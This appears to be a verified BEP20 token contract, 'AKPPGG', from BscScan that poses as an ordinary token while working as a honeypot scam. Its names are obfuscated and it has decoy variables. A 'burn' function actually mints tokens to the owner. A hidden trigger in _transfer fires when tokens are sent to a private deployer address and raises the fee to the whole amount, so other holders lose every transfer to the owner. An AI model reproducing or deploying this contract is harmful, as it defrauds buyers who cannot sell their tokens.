/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.5.11;
contract KfVpAg {
address public  wYWhmc = address(0);
uint256 public  iCwZIw = 100000000000000000000;
uint256 public  vBCTit = 100000000000000000;
uint8 public constant decimals = 18;
address public  JPEcpn = address(0);
string public  name = "AKPPGG";
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  WTSGaT = 10000000000000000;
uint256 public  bGnLxs = 100000000000000000000000;
address private  QRcPzD = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address public  feHUbj = address(0);
address public  lEraPZ = address(0);
string public  symbol = "AKPPGG";
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  nDQmzy = 10000000000000;
uint256 public  lKFkZl = 100000000000000000000000;
uint256 public  NLHQwv = 10000000000000000000000000000;
uint256 public  EWigMi = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant frSLWz = 9+1;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  rGvPZX = 10000000000000000000;
address public  suChEL = address(0);
address public  avywaX = address(0);
address public owner;
mapping (address => uint256) public balanceOf;
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () public {
QRcPzD = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "AKPPGG");
require(to != address(0), "AKPPGG");
require(amount <= balanceOf[from], "AKPPGG");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* frSLWz/nDQmzy ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==QRcPzD){
nDQmzy = 9+1;
}
emit Transfer(from, to, transferAmount);
}

}